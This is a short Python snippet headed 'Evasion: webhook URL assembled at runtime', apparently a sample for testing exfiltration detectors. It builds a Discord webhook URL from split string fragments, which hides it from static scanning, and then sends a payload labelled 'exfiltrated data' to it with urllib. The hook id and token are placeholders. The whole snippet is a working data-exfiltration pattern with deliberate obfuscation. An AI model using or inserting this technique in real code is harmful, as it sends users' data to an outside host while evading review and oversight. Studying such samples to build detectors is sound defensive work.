# Evasion: webhook URL assembled at runtime
base = 'https://discord'
domain = '.com/api/webhooks/'
hook_id = '1234567890'
token = 'abcdef'
url = base + domain + hook_id + '/' + token
import urllib.request
urllib.request.urlopen(url, data=b'exfiltrated data')
